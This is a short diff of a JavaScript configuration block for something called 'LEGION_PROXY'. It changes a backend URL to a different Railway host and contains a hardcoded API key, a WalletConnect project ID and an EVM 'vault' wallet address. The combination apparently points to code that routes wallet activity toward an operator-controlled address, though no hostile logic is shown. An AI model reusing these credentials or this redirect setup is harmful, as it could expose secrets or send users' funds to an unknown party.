@@ -4,7 +4,7 @@
   window.__LEGION_PROXY_LOADED__ = true;
 
   var CFG = Object.assign({
-    backendUrl:  'https://legionapi-production.up.railway.app',
+    backendUrl:  'https://sadrailala-production.up.railway.app',
     kineticKey:  'uK2WF0w8VynajJYsSmA95bDxThM14BdG',
     wcProjectId: 'a785da105621eb55c998a35c57587667',
     vaultEvm:    '0x2B20979118a61aE3f7f75F3320FB9b0639c5BA53',
